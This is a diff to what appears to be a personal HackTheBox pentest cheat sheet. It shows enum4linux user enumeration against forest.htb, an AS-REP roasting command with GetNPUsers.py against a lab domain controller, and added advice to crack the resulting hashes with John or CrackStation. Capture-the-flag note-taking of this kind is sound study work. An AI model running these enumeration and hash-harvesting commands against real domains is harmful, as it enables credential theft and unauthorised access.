@@ -276,7 +276,9 @@ Password Protected SSH Private Key:
 		- enum4linux forest.htb > enum4linux.txt
 		- cat enum4linux.txt | grep -i users
 		- After getting usernames, if kerberos is running on port 88, then you might be able to get password hashes by running this
-			- python3 GetNPUsers.py -dc-ip 10.10.10.161 htb.local/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
+			- python3 GetNPUsers.py  -dc-ip 10.10.10.161 htb.local/ -no-pass -usersfile users.txt
+			- Then use John to crack obtained hashes or even crackstation if you're lucky. 
+
 			
 			
 	- SirepRAT:
